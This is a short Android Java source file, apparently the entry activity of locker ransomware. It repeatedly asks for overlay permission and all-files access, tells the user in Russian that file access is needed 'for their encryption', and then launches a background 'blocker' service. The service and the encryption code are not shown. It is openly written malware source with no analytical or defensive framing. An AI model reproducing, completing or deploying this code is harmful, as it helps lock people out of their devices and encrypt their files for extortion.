package com.locker;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        
        // Запрос на оверлей
        if (!Settings.canDrawOverlays(this)) {
            startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())));
        } 
        // Запрос на файлы (для Android 11+)
        else if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            Toast.makeText(this, "Разрешите доступ к файлам для их шифрования", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
        }
        // Если всё разрешено, запускаем блокировщик
        else {
            startService(new Intent(this, LockService.class));
            finish();
        }
    }
    
    @Override protected void onResume() {
        super.onResume();
        if (Settings.canDrawOverlays(this) && (Build.VERSION.SDK_INT < 30 || Environment.isExternalStorageManager())) {
            startService(new Intent(this, LockService.class));
            finish();
        }
    }
}
